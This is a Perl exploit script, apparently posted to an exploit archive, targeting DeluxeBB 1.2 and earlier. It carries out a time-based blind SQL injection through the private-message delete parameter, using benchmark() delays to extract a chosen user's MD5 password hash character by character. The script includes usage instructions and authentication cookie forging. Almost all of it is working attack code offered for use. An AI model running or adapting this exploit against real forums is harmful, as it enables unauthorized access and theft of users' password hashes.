#!/usr/bin/perl 
# --------------------------------------------------
# DeluxeBB <= 1.2 Remote Blind SQL Injection Exploit
# --------------------------------------------------
# by athos - staker[at]hotmail[dot]it
# download on http://deluxebb.com
# --------------------------------------------------
# Usage:
# perl xpl.pl host/path prefix id password target id
# perl xpl.pl localhost/deluxebb deluxebb 5 r00x 1
# --------------------------------------------------
# Note: magic_quotes_gpc off
#       don't add me on msn messenger
#       my email staker.38@gmail.com
# --------------------------------------------------
# Greetz: str0ke,The:Paradox and #cancer
# --------------------------------------------------

use strict;
use Digest::MD5('md5_hex');
use LWP::UserAgent;

my ($hash,$http);
my ($host,$prefix,$user,$pass,$target) = @ARGV;

$http = new LWP::UserAgent(timeout => 5);

if (@ARGV != 5)
{
      print "\n+----------------------------------------------------+\r",
            "\n| DeluxeBB <= 1.2 Remote Blind SQL Injection Exploit |\r",
            "\n+----------------------------------------------------+\r",
            "\nby athos - staker[at]hotmail[dot]it\n",
            "\nUsage     + perl $0 [host/path] [prefix] [ID] [password] [target ID]",
            "\nHost      + localhost/DeluxeBB",
            "\nID        + your user ID",
            "\nPassword  + your password",
            "\nPrefix    + table prefix (default: deluxebb)",
            "\nTarget ID + target id\n";
      exit;
}      

$http->default_header('Cookie' => cookies($user,$pass));

&exploit;

sub getUsername
{
      my ($user_id,$response,@nickname) = $_[0];
 
      $response = $http->get("http://$host/misc.php?sub=profile&uid=$user_id");
      @nickname = $response->as_string =~ m{<span class="misctext">(.+?)</span>}ig;
      
      return $nickname[1];
}      



sub cookies
{
      my ($username);
      my ($user_id,$password) = @_;
      
      $username = getUsername($user_id);
      $password = md5_hex($password);
      
      return qq{membercookie=$username; memberid=$user_id; memberpw=$password;};
}      
      
      
sub getMsg
{
      my $response = $http->get("http://$host/pm.php?sub=folder&name=inbox");
      
      if ($response->as_string =~ m/pid=(\d+)./i)
      {
            return $1;
      }
      else
      {
            my $content = {
                 to       => getUsername($user),
                 subject  => rand(999),
                 posticon => 'none',
                 rte1     => rand(999),
                 submit   => 'Send'

            };  
                            
                            
            my $request = $http->post("http://$host/pm.php?sub=newpm",$content);
            my $read_id = $http->get("http://$host/pm.php?sub=folder&name=inbox");
            
            if ($read_id->content =~ /pid=(\d+)./i)
            {
                  return $1;
            }
      }      
}      
    

sub sql
{
      my ($i,$j,$sql) = (shift,shift,undef);
      
      $sql = "%27+OR+(SELECT+IF((ASCII(SUBSTRING(pass,$i,1))=$j),".
             "benchmark(200000000,CHAR(0)),0)+FROM+${prefix}_users".
             "+WHERE uid=$target))%23";
             
      return $sql;        
}        
    

sub delay
{
      my ($tm1,$tm2) = (undef,undef);
      my ($msg,$sql) = @_;
      
      $tm1 = time();
      
      $http->get("http://$host/pm.php?sub=do&submit=Delete&delete$msg=$sql");

      $tm2 = time();
      
      return $tm2 - $tm1;
}
    
    
sub exploit
{
      my ($i,$ord) = (1,undef);
      my @chr = (48..57, 97..102); 
      
      for ($i..32)
      {
            foreach $ord(@chr)
            {
                  if (delay(&getMsg,&sql($i,$ord)) >= 5)
                  {
                        syswrite(STDOUT,chr($ord)); $hash .= chr($ord);
                        last;
                        $i++;
                  }      
                  
                  if ($i == 2 and not defined $hash)
                  {
                        syswrite(STDOUT,"Exploit Failed!\n");
                        exit;
                  }
            } 
      }                 
}    

